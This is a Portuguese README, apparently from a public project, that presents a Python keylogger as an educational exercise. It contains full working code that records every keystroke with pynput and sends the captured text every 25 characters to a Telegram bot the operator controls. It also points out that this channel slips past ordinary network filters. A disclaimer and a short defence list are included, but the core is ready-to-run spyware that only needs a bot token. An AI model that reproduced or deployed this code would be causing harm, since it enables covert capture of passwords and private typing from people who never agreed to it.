# 🕵️ Keylogger Simulado com Python e Notificação via Telegram

Demonstração prática do funcionamento de um keylogger desenvolvido em Python,
com exfiltração simulada via Telegram Bot, em ambiente isolado e controlado,
com foco em compreender como esse tipo de malware opera e como se defender dele.

> ⚠️ **Aviso Legal:** Este projeto foi desenvolvido exclusivamente para fins
> educacionais, em ambiente isolado. Jamais utilize este código em sistemas
> sem autorização expressa. A reprodução deste código fora de ambientes
> controlados pode configurar crime previsto na Lei nº 12.737/2012 (Lei Carolina Dieckmann).

---

## 🧪 Ambiente Utilizado

| Componente       | Detalhes                        |
|------------------|---------------------------------|
| Linguagem        | Python 3.x                      |
| Bibliotecas      | pynput, requests                |
| Exfiltração      | Telegram Bot API                |
| Ambiente         | VM isolada / ambiente controlado|

---

## 📦 Dependências

```bash
pip install pynput requests
```

---

## 🔑 Configuração do Telegram Bot

1. Acesse o [@BotFather](https://t.me/BotFather) no Telegram
2. Crie um novo bot com o comando `/newbot`
3. Copie o **token** gerado
4. Obtenha seu **chat_id** acessando:
   `https://api.telegram.org/bot<SEU_TOKEN>/getUpdates`

Configure as credenciais como variáveis de ambiente — **nunca exponha tokens diretamente no código:**

---

## 🧠 Como Funciona

```
Tecla pressionada
      ↓
Capturada pelo pynput
      ↓
Adicionada ao buffer
      ↓
Buffer atingiu 25 caracteres?
      ↓ sim
Envia via Telegram Bot API
      ↓
Buffer resetado
```

A cada **25 caracteres digitados**, o conteúdo é enviado automaticamente
ao Telegram. Teclas especiais como `ENTER`, `SPACE` e `BACKSPACE` são
registradas com marcadores legíveis. O listener encerra com `ESC`,
enviando o buffer restante antes de sair.

---

## 📄 Código

```python
import os
import requests
from pynput.keyboard import Key, Listener

# Configurações via variável de ambiente (nunca exponha tokens no código)
BOT_TOKEN = os.environ.get('TELEGRAM_TOKEN', 'COLE_O_TOKEN_AQUI')
CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', 'COLE_O_CHAT_ID_AQUI')

buffer = ""
LIMITE = 25

def send_telegram(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, data={"chat_id": CHAT_ID, "text": text})
    except Exception as e:
        print(f"Erro ao enviar: {e}")

def on_press(key):
    global buffer
    try:
        if key == Key.enter:
            buffer += "\n[ENTER]\n"
        elif key == Key.space:
            buffer += " "
        elif key == Key.backspace:
            buffer += "[BACKSPACE]"
        else:
            buffer += str(key).replace("'", "")
    except Exception as e:
        print(f"Erro: {e}")

    if len(buffer) >= LIMITE:
        send_telegram(buffer)
        buffer = ""

def on_release(key):
    if key == Key.esc:
        if buffer:
            send_telegram(buffer)
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```

---

## 🖥️ Execução do Keylogger

![Terminal](Terminal.jpg)

![Telegram Log](Telegram.jpg)

## 🛡️ Medidas de Defesa e Prevenção

Com base neste estudo, as seguintes medidas protegem contra keyloggers reais:

1. **Antivírus / EDR** — soluções modernas detectam comportamento de captura de teclado
2. **Princípio do menor privilégio** — keyloggers precisam de permissão para interceptar eventos globais de teclado
3. **Teclados virtuais** — para senhas críticas, teclados na tela dificultam a captura
4. **Autenticação multifator (MFA)** — mesmo com a senha capturada, o acesso é bloqueado
5. **Monitoramento de processos** — ferramentas como Sysmon (Windows) detectam scripts suspeitos em execução
6. **Sandboxing** — executar arquivos desconhecidos em ambientes isolados antes de abrir
7. **Conscientização** — a maioria dos keyloggers chega por phishing ou downloads maliciosos

---

## 📚 Aprendizados

- Keyloggers são simples de implementar, o que os torna uma ameaça real e acessível
- A exfiltração via Telegram é difícil de bloquear por filtros de rede comuns, pois usa HTTPS para um serviço legítimo
- Expor tokens e credenciais no código é uma falha grave — variáveis de ambiente são a prática correta
- Ambientes isolados são indispensáveis para qualquer teste desse tipo

---

## 🔗 Referências

- [Python – Documentação Oficial](https://www.python.org/)
- [pynput – Biblioteca de Captura de Teclado](https://pynput.readthedocs.io/)
- [Telegram Bot API](https://core.telegram.org/bots/api)
